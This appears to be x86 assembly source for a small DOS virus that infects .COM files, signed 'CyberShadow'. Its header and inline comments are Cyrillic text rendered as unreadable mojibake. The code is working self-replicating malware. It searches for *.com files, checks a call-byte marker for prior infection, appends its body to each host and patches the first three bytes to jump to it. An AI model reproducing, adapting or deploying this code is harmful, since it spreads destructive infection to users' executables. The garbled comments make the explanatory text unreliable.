.model tiny
.code
org 100h
;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;� �짛, Þ收誓率βα� 쵟ゥ�履º� ˘說�젹�? 띲 譽� �, 細�循ⓥ� � 췅笹젲쩆⒱α�, �
;� М� �젹硫  쵟ゥ�履Ł ˘說貰曄�, �젳僧ⅴ恂�  ��誓㎤ㄵ�� (쵟ゥ�履�� 誓㎤ㄵ�瞬 �
;� Л� �ⅷ�收誓說�,��獸с 첓� �젹 GOD ´ゥ� ⓨ ㄵ쳽筍 쵟ゥ�履º�!) Enjoy it... �
;�                                                    CyberShadow...           �
;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;--------------------------------------
Const1 = offset FreeByte - offset Start
Const2 = offset EndVirus - offset Start

;--------------------------------------
Begin:  call Start
Start:
        pop DI
        mov BP,3
	mov si,di
        sub DI,BP               ;DI=100h
        push DI
;      --------------------------------
        add SI,DS:[di+1]        ;�
        push SI                 ;�
;      --------------------------------
        add SI,Const1           ;�
        push SI                 ;�
        movsw                   ;� �쩺��ⓤ젷� 칛젪Œ彛瑜
        movsb                   ;�    �쩺�瑜 3 줎⒱�.
;      --------------------------------
        mov DX,SI               ;�
        mov AH,4eh              ;�
        int 21h                 ;�
        pop SI DI               ;�
;--------------------------------------
Next:   mov DX,9eh              ;�
        mov AX,3d02h            ;� �洙p維� �.
        int 21h                 ;�
        xchg bx,ax
;      --------------------------------
        mov DX,SI               ;�
        mov CX,BP               ;� 葉�젰� �쩺�瑜 3 줎⒱�
        mov AH,3fh              ;�
        int 21h                 ;�
;      --------------------------------
        cmp byte ptr [si],0e8h  ;뤲�´黍エ刷 췅 쭬�젲����
        je short close_file     ;(αエ ⅲ� 嵩�졻� ▲ㄵ� �젳Д� Д�麟�,
                                ;�� � �ⅲ� � �젶 ぎ薛ⅹ狩�飡� 쵟ギ...)
        dec ax
        call Proc1              ;� �쩺�Д飡Œⓤ�
        sub SI,BP               ;�  췅 ぎ�ζ �.
        sub AX,BP               ;�
        mov [SI+1],AX           ;�
;      --------------------------------
        mov DX,DI               ;�
        mov Cl,Const2           ;�
        mov AH,40h              ;� 쭬�ⓤ젷� 收ギ
        int 21h                 ;�
;      --------------------------------
        mov AL,0                ;� �쩺�Д飡Œⓤ�
        call Proc1              ;� 췅 췅�젷� �.
;      --------------------------------
        mov DX,SI               ;�
        mov CX,BP               ;�   ��飡젪Œ� call
        mov AH,40h              ;�     � 췅�젷� �
        int 21h                 ;�
;      --------------------------------
        add si,bp
close_file:
        mov AH,3eh              ;� 쭬챥維� �
        int 21h                 ;�
        mov AH,4fh              ;�
        int 21h                 ;� 笹ⅳ莘蟯� �
        jnc short next          ;�
Proc1:  cwd               ;듽褻�� � �.
        sub CX,CX
        mov AH,42h
        int 21h
        ret
;--------------------------------------
Jump:   call Begin
FreeByte:
        nop
        nop
        ret
Fname   db '*.com',0
EndVirus:
;--------------------------------------
end begin
